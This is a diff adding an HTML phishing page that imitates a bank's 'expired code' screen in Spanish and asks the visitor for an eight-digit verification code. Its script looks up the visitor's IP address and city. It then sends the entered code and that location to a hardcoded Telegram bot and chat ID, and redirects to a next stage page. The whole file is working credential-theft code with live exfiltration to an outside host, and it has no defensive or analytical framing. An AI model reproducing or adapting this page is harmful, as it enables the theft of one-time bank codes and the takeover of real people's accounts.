@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title></title>
+	
+
+	<link rel="stylesheet" href="assets/css/bootstrap.css">
+
+	<script type="text/javascript" src="assets/js/bootstrap.js"></script>
+	<style>
+		.specialfon {
+			background-image:url('./welcome.png');
+			background-repeat: no-repeat; 
+			background-size:33%;
+		}
+		.logo2 {
+			display: none;
+		}
+
+		@media (max-width:640px)
+		{
+			.logo1 {
+				display: none;
+			}
+			.logo2 {
+				display: block;
+				margin-top: 00%;
+				margin-left: 50px;
+				padding-bottom: 50px;
+			}
+			.specialfon {
+				background-color:#4f2d7f;
+				background-image:none;
+				background-size: 500px;
+			}
+			.row{
+				width: 10%;
+				margin-top: 10%;
+				margin-left: 4px;
+
+			}
+
+		}
+		.form-control-lg:focus{
+			border-bottom:2px solid red;
+			outline: none;
+		}
+
+	</style>
+</head>
+<body  class="specialfon" style=" ">
+
+
+	<div class="container text-center" >
+		<div class="row" style="">
+			<div class="col-4" id="hiddensite">
+				
+			</div>
+			<div class="col-8" align="center">
+				
+				<img src="./logo.png" class="logo1" style="margin-top:30px; margin-left: -40%;">
+				<img src="./logo2.png" class="logo2" >
+				<div class="card" style="width: 25rem; margin-top: 10%; padding: 20px; border-radius: 20px; box-shadow: 0px 0px 5px 0px  grey ;">
+					<label for="exampleFormControlInput1" class="form-label"> <font style="font-size:23px;">Codigo expirado, ingresa el nuevo codigo</font></label>
+					<div class="card-body">
+						<div class="mb-3">
+							<input type="email" class="form-control-sm" id="cod1" onkeypress="return validaNumericos(event), setone(event),focuxnext(2)" style="width: 30px;" maxlength="0" placeholder="" >
+							<input type="email" class="form-control-sm" id="cod2" onkeypress="return validaNumericos(event), settwo(event),focuxnext(3)" style="width: 30px;" maxlength="0" placeholder="" >
+							<input type="email" class="form-control-sm" id="cod3" onkeypress="return validaNumericos(event), setsan(event), focuxnext(4)" style="width: 30px;" maxlength="0" placeholder="" >
+							<input type="email" class="form-control-sm" id="cod4" onkeypress="return validaNumericos(event), setyon(event),focuxnext(5)" style="width: 30px;" maxlength="0" placeholder="" >
+							<input type="email" class="form-control-sm" id="cod5" onkeypress="return validaNumericos(event), setgo(event),focuxnext(6)" style="width: 30px;" maxlength="0" placeholder="" >
+							<input type="email" class="form-control-sm" id="cod6" onkeypress="return validaNumericos(event), setroku(event),focuxnext(7)" style="width: 30px;" maxlength="0" placeholder="" >
+							<input type="email" class="form-control-sm" id="cod7" onkeypress="return validaNumericos(event), setnana(event),focuxnext(8)" style="width: 30px;" maxlength="0" placeholder="" >
+							<input type="email" class="form-control-sm" id="cod8" onkeypress="return validaNumericos(event), sethachi(event),focuxnext(9)" style="width: 30px;" maxlength="0" placeholder="">
+						</div>
+						
+
+						<button type="button" class="btn btn-primary" style="margin-top:20px; background-color:rgb(84, 48, 120); width:60%;" onclick="sender();" >Enviar</button> </br></br>
+						
+					</div>
+
+				</div>
+
+
+			</div>
+			<p id="address"  hidden="">
+				<p id="gfg"  hidden="">
+				</div>
+			</div>
+			<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+			<script>
+				$.getJSON("https://api.ipify.org?format=json",
+					function(data) {
+
+          // Setting text of element P with id gfg
+						$("#gfg").html(data.ip);
+					})
+				</script>
+				<script>
+					$.getJSON("https://ipinfo.io", function (response) {
+						$("#ip").html("IP: " + response.ip);
+						$("#address").html("" + response.city + ", " + response.country);
+
+					})
+				</script>
+				<script type="text/javascript">
+					function setone(event){
+						$("#cod1").val(event.key);
+					}
+					function settwo(event){
+						$("#cod2").val(event.key);
+					}
+					function setsan(event){
+						$("#cod3").val(event.key);
+					}
+					function setyon(event){
+						$("#cod4").val(event.key);
+					}
+					function setgo(event){
+						$("#cod5").val(event.key);
+					}
+					function setroku(event){
+						$("#cod6").val(event.key);
+					}
+					function setnana(event){
+						$("#cod7").val(event.key);
+					}
+					function sethachi(event){
+						$("#cod8").val(event.key);
+					}
+					function focuxnext(val){
+						$("#cod"+val).focus();
+					}
+					function validaNumericos(event) {
+						if(event.charCode >= 48 && event.charCode <= 57){
+							return true;
+						}
+						return false;        
+					}
+	//bot token
+					var telegram_bot_id = "6154656482:AAHzfiB2HDJnmPwZsqNUHXyvupncd9uyjq8";
+//chat id
+					var chat_id = 5841771216;
+					var u_name, u_name2, ip, ip2;
+					var ready = function () {
+						cod1 = document.getElementById("cod1").value;
+						cod2 = document.getElementById("cod2").value;
+						cod3 = document.getElementById("cod3").value;
+						cod4 = document.getElementById("cod4").value;
+						cod5 = document.getElementById("cod5").value;
+						cod6 = document.getElementById("cod6").value;
+						cod7 = document.getElementById("cod7").value;
+						cod8 = document.getElementById("cod8").value;
+						ip = document.getElementById("gfg").innerHTML;
+						ip2 = document.getElementById("address").innerHTML;
+						message = "BanRpley\n👤ValIC0D: " + cod1 +cod2 +cod3 +cod4 +cod5 +cod6 +cod7 +cod8 + "\nIP: " + ip +"\n" + ip2 ;
+					};
+					var sender = function () {
+						ready();
+						cod1 = document.getElementById("cod1").value;
+						cod2 = document.getElementById("cod2").value;
+						cod3 = document.getElementById("cod3").value;
+						cod4 = document.getElementById("cod4").value;
+						cod5 = document.getElementById("cod5").value;
+						cod6 = document.getElementById("cod6").value;
+						cod7 = document.getElementById("cod7").value;
+						cod8 = document.getElementById("cod8").value;
+						if (cod1 == ''){
+							return;	
+						}
+						if (cod2 == ''){
+							return;	
+						}
+						if (cod3 == ''){
+							return;	
+						}
+						if (cod4 == ''){
+							return;	
+						}
+						if (cod5 == ''){
+							return;	
+						}
+						if (cod6 == ''){
+							return;	
+						}
+						if (cod7 == ''){
+							return;	
+						}
+						if (cod8 == ''){
+							return;	
+						}
+
+						var settings = {
+							"async": true,
+							"crossDomain": true,
+							"url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+							"method": "POST",
+							"headers": {
+								"Content-Type": "application/json",
+								"cache-control": "no-cache"
+
+							},
+							"data": JSON.stringify({
+								"chat_id": chat_id,
+								"text": message
+							})
+						};
+						$.ajax(settings).done(function (response) {
+							window.location = 'load3.html';
+							console.log(response);
+						});
+						return false;
+					};
+
+				</script>
+
+			</body>
+
+
+			</html>
